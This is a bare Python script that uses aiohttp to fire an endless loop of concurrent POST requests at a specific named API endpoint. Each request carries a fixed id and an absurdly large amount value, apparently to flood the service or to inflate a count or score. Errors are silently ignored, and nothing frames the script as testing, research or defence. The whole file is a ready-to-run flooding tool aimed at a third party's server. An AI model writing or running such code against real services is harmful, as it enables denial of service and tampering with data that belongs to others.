import asyncio, aiohttp, time

URL = 'https://api-ryukogo2026.shibadogcap.com/v'
HDR = {'Content-Type': 'application/json'}
BODY = b'{"i":2974,"a":1000000000000000}'

async def one(s, sem):
    async with sem:
        try:
            async with s.post(URL, data=BODY, headers=HDR, timeout=aiohttp.ClientTimeout(total=10)) as r:
                pass
        except: pass

async def main():
    sem = asyncio.Semaphore(100)
    conn = aiohttp.TCPConnector(limit=100, limit_per_host=100)
    async with aiohttp.ClientSession(connector=conn) as s:
        while True:
            await asyncio.gather(*[one(s, sem) for _ in range(200)])

asyncio.run(main())
